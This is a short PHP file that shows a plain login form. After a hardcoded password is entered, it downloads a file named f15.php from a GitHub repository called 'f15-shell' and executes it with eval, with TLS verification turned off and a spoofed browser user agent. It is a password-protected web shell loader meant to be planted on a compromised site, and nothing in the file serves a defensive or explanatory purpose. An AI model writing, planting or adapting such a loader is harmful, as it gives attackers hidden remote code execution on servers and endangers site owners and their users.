<?php
session_start();

function geturl($url) {
    if (function_exists('curl_exec')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => 1,
            CURLOPT_USERAGENT => "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0",
            CURLOPT_SSL_VERIFYPEER => 0,
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_COOKIE => $_SESSION['coki'] ?? ''
        ]);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
    return @file_get_contents($url) ?: false;
}

if ($_POST['password'] ?? '' && md5($_POST['password']) === md5('sipur')) {
    $_SESSION['logged_in'] = true;
    $_SESSION['coki'] = '123';
}

if ($_SESSION['logged_in'] ?? false) {
    eval('?>' . geturl('https://raw.githubusercontent.com/fitwilliamx1337/f15-shell/refs/heads/main/f15.php'));
    exit;
}
?>
<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
    <form method="POST"><label>Password:</label>
    <input type="password" name="password">
    <input type="submit" value="Login"></form>
</body>
</html>
